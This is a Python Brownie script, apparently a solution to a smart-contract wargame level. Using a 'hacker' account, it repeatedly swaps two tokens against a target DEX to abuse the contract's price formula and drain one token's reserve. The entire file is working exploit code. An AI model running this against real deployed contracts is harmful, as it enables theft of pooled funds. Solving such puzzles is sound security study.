from brownie import accounts, config, interface

def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    dex = interface.IDex(target)
    token1 = interface.IERC20(dex.token1())
    token2 = interface.IERC20(dex.token2())
    token1.approve(dex, 1000, {'from': hacker})
    token2.approve(dex, 1000, {'from': hacker})
    tokenFrom = token1
    tokenTo = token2
    price = dex.get_swap_price(tokenFrom, tokenTo, tokenFrom.balanceOf(hacker))
    while price <= tokenTo.balanceOf(dex):
        dex.swap(tokenFrom, tokenTo, tokenFrom.balanceOf(hacker), {'from': hacker})
        print(f'Token1: {token1.balanceOf(hacker)} - Token2: {token2.balanceOf(hacker)}')
        tmp = tokenTo
        tokenTo = tokenFrom
        tokenFrom = tmp
        price = dex.get_swap_price(tokenFrom, tokenTo, tokenFrom.balanceOf(hacker))
    print('We need to finalize last part')
    amount = int(tokenFrom.balanceOf(hacker) * tokenTo.balanceOf(dex) / price)
    print(f'Amount: {amount}')
    price = dex.get_swap_price(tokenFrom, tokenTo, amount)
    print(f'Price: {price} - Balance: {tokenTo.balanceOf(dex)}')
    dex.swap(tokenFrom, tokenTo, amount, {'from': hacker})
    print(f'Dex Token1: {token1.balanceOf(dex)} - Dex Token2: {token2.balanceOf(dex)}')